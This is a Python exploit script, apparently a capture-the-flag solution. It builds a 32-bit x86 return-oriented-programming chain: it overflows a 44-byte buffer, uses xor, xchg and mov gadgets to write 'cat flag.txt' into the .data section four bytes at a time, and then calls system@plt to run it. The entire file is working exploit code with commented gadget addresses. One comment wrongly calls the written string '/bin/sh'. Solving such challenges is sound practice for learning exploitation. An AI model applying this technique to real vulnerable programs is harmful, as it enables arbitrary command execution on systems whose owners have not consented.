import struct
import binascii

zero_out_edx = 0x08048671	# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
pop_ebx = 0x080483e1		# pop ebx ; ret
mov_ebx_edx = 0x0804867b	# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xchg_edx_ecx = 0x08048689	# xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
mov_ecx_edx = 0x08048693	# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
system_plt = 0x8048430
dest = 0x0804a028		# in data section (this will overwrite some stuff in .data but it doesn't matter)

# since its x86 we have to write 4 bytes at a time
def write_4bytes(data, dest):
	p = ""
	p += struct.pack("I", zero_out_edx)	# zeroes out edx and pops 4 bytes into esi
	p += "AAAA"				# garbage to fill esi
	p += struct.pack("I", pop_ebx)		# ebx = destination_addr
	p += struct.pack("I", dest)		# destination_addr = .data
	p += struct.pack("I", mov_ebx_edx)	# this xors edx by ebx thus now edx = ebx (since edx was 0x00000000)
	p += "AAAA"				# garbage to fill ebp
	p += struct.pack("I", xchg_edx_ecx)	# move dest_addr into ecx
	p += "AAAA"				# garbage to fill ebp
	
	# we are moving data from ebx to edx then to ecx because our write gadget expects the dest addr to be in ecx
	# move 4 bytes into edx
	p += struct.pack("I", zero_out_edx)	# gets edx ready to be written to
	p += "AAAA"
	p += struct.pack("I", pop_ebx)		# pops the 4 bytes of data into ebx
	p += struct.pack("I", int(binascii.hexlify(data), 16))	# convert str to integer for pack to apply little-endian order on
	p += struct.pack("I", mov_ebx_edx)	# move 4 bytes from ebx to edx
	p += "AAAA"
	# write content of edx into memory (addr in ecx)
	p += struct.pack("I", mov_ecx_edx)
	p += "AAAA"
	p += "\x00\x00\x00\x00"				# zeroes out ebx in avoid corrupting the data that we just written by the xor operation in mov_ecx_edx
	return p

def main():
	p = "A"*44

	# write cat flag.txt 4 bytes at a time (x86 little-endian)	
	p += write_4bytes(" tac", dest)
	p += write_4bytes("galf", dest+4)
	p += write_4bytes("txt.", dest+8)

	p += struct.pack("I", system_plt)
	p += "\xff\xff\xff\xff"			# garbage return addr (can be the addr of exit in libc to avoid seg fault)
	p += struct.pack("I", dest)		# addr of /bin/sh

	print(p)

if __name__ == "__main__":
	main()

